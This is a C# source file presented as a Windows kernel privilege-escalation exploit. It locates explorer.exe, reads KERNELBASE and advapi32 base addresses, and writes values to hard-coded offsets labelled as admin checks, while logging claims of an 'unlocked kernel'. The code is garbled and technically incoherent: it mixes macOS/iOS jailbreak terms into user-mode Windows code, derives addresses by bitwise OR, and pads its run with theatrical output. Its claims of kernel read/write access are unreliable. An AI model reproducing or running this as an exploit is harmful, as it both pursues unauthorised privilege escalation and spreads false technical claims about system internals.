using System;
using System.Diagnostics;
using kernel_utility;
namespace win_kern_port
{
    public class port
    {
        kernel_utility.kutil MainUtility = new kutil();
        public string HexDump(Int64 path, int size)
        {
            /*/
              * DUMP MEMORY LEAK INSTEAD OF LOCAL FILE
              * KERNELBASE.dll IS PROTECTED UNLESS WE USE LIVE DUMPING.
            /*/

            string hex = "$    " + MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + path, size).ToString("X2");
            return hex;
        }
        public void main()
        {

            MainUtility.LOG("kern_slide -> 0x{0}", hardcoded_kern_slide);
            MainUtility.LOG("/*/", 0);

            MainUtility.LOG(" * SOME DATA FROM KERNELBASE" + Environment.NewLine + HexDump(0x169608, 200), 0);
            MainUtility.LOG("/*/", 0);
            MainUtility.LOG("-----------------------", 0);
          
            if (doPatchPriviliges == true)
            {
                MainUtility.LOG("/*/", 0);
                MainUtility.LOG(" * SPRAYING SOME IMPORTANT OFFSETS (THIS STUFF WILL RETURN BACK TO ORIGINAL AFTER CLEANUP)", 0);
                MainUtility.LOG("/*/", 0);
                MainUtility.LOG(" * leaked with kernelslide+kernbase -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base | hardcoded_kern_slide + dq_aIsuseranadmin, 20));
                MainUtility.k_write32(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base | hardcoded_kern_slide + dq_aIsuseranadmin, 20);
                MainUtility.LOG(" * patched leaked with kernelslide+kernbase -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base | hardcoded_kern_slide + dq_aIsuseranadmin, 20));
                MainUtility.LOG(" * dq_aIsuseranadmin -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + dq_aIsuseranadmin, 20));
                MainUtility.k_write32(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + dq_aIsuseranadmin, 20);
                MainUtility.LOG(" * dq_aIsuseranadmin -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + dq_aIsuseranadmin, 20));
                MainUtility.LOG(" * aSetconsoletitl_1 -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + aSetconsoletitl_1, 20));
                MainUtility.k_write32(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + aSetconsoletitl_1, 20);
                MainUtility.LOG(" * aSetconsoletitl_1 -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + aSetconsoletitl_1, 20));
                MainUtility.LOG(" * SetWindowTheme -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + SetDefaultTheme, 20));
                MainUtility.k_write32(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + SetDefaultTheme, 20);
                MainUtility.LOG(" * SetWindowTheme -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + SetDefaultTheme, 20));
                System.Threading.Thread.Sleep(100);
                Console.Write("$ ");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write("$ ");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write(".");
                System.Threading.Thread.Sleep(100);
                Console.Write("." + Environment.NewLine);
            }


            /*/
                * NOW WE ARE GOING TO SPRAY RANDOM ADDRESSES IN ADVAPI32
                * ADVAPI32 IS THE BASE OF SYSTEM SECURITY CALLS ETC.
            /*/

           
            MainUtility.k_stabilityrwe(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), advapi_base + kernel_random_addr, 33);
            MainUtility.k_stabilityrwe(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + kernel_random_addr, 33);
            MainUtility.LOG("-----------------------", 0);
            MainUtility.LOG("/*/", 0);
            MainUtility.LOG(" * WE ARE GAINING STABLE R/W ON KERNEL", 0);
            MainUtility.LOG(" * THIS MIGHT TAKE A WHILE JUST WAIT", 0);
            MainUtility.LOG("/*/", 0);
            MainUtility.LOG("-----------------------", 0);
            MainUtility.LOG(" * ALL SET ENJOY YOUR UNLOCKED KERNEL (AN UNLOCKED KERNEL MIGHT CAUSE INSTABILITY SO USE IT AT YOUR OWN RISK)", 0);
            MainUtility.LOG(" * NOTE: THIS EXPLOIT IS SEMI-UNTETHERED SO ALL PROCCESS WILL GO BACK TO DEFAULT ONCE YOUR PC REBOOTS.", 0);
            MainUtility.LOG(" * test write to kernel 0xF -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + 0xF, 20));
            MainUtility.k_write32(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base  + 0xF, 0x20);
            MainUtility.LOG(" * test write to kernel 0xF -> 0x{0}", MainUtility.k_read64(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + 0xF, 20));
            MainUtility.LOG(" * ADD YOUR CODE HERE", 0);
            if (doCleanup == true)
            {
                if (advapi_base > 0x0)
                {
                    MainUtility.LOG("\n-----------------------", 0);

                    MainUtility.LOG("/*/", 0);
                    MainUtility.LOG(" * REAL CLEAN UP KERNEL...", 0);
                    MainUtility.LOG("/*/", 0);
                    MainUtility.LOG("-----------------------", 0);

                    MainUtility.k_noaccess(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), advapi_base + kernel_random_addr, 33);
                    MainUtility.k_noaccess(MainUtility.task_for_pid(0x0FFFFF, false, pid__t), dll_ker_base + kernel_random_addr, 33);
                }
            }

            Console.ReadKey();
        }

        // EXPLOIT PREFERENCES -> DON'T TOUCH IF YOU DON'T KNOW WHAT ARE THEY ABOUT
        bool doCleanup = false;
        bool doPatchPriviliges = true;

        // KERN_STRUCTURE -> BUILT AUTOMATICALLY
        public Int64 explorer_base = 0x0;
        public Int64 advapi_base = 0x0;
        public Int64 dll_ker_base = 0x0;
        public Int64 hardcoded_kern_slide = 0x0;
        public Int64 kernel_random_addr = 0x0;
        public Int64 kern_pool_size = 0x0;
        public int pid__t = 0x0;


        // KERN_OFFSETS -> ABIT LIKE TWEAKING
        public Int64 aSetconsoletitl_1 = 0x1CC830;
        public Int64 SetDefaultTheme = 0x16CCC0;
        public Int64 aBeginbufferedp = 0x16CE20;

        // KERN_OFFSETS -> Privilige Escape
        public Int64 dq_aIsuseranadmin = 0x1695E0;

        public long bf_kernel_base()
        {
            MainUtility.LOG("bruteforcing kernelbase....", 0);
            Int64 exp_base = Process.GetProcessesByName("EXPLORER")[0].MainModule.BaseAddress.ToInt64();
            MainUtility.LOG("explorerbase -> 0x{0}", long.Parse(exp_base.ToString().Replace("-", "")));
            var exp_mod = System.Diagnostics.Process.GetProcessesByName("EXPLORER")[0];
            pid__t = exp_mod.Id;
            foreach (ProcessModule a in exp_mod.Modules)
            {


                if (a.ModuleName.Contains("KERNELBASE"))
                {
                    /*/
                     * GOT KERNELBASE.DLL MKAY COOL!
                    /*/

                    Int64 dll_kern_base = a.BaseAddress.ToInt64();
                    Int64 dll_kern_base_pac = dll_kern_base | 0x0ffffff;

                    if (dll_kern_base > 0)
                    {
                        MainUtility.LOG("/*/", 0);
                        MainUtility.LOG(" * GOT KERNELBASE.DLL MKAY COOL!", 0);
                        MainUtility.LOG("/*/", 0);
                    }
                    MainUtility.LOG("kernel_base -> 0x{0}", dll_kern_base);
                    MainUtility.LOG("kernel_base_pac -> 0x{0}", dll_kern_base_pac);
                    dll_ker_base = dll_kern_base;
                    kern_pool_size = a.ModuleMemorySize;
                    Int64 kern_slide = dll_kern_base | a.ModuleMemorySize;
                    hardcoded_kern_slide = kern_slide;


                }
        
                if (a.ModuleName.Contains("advapi"))
                {
                    Int64 dll_advapi32 = a.BaseAddress.ToInt64();
                    Int64 dll_advapi32_pac = dll_advapi32 | 0x0ffffff;
                    if (dll_advapi32 > 0)
                    {
                        MainUtility.LOG("/*/", 0);
                        MainUtility.LOG(" * GOT advapi32 MKAY COOL!", 0);
                        MainUtility.LOG("/*/", 0);
                    }
                    MainUtility.LOG("advapi32_base -> 0x{0}", dll_advapi32);
                    MainUtility.LOG("advapi32_base_pac -> 0x{0}", dll_advapi32_pac);
                    advapi_base = dll_advapi32;

                    System.Threading.Thread.Sleep(2000);
                    main(); // GO DO IT
                }

            }
            explorer_base = exp_base;
            return 0;
        }
    }
}
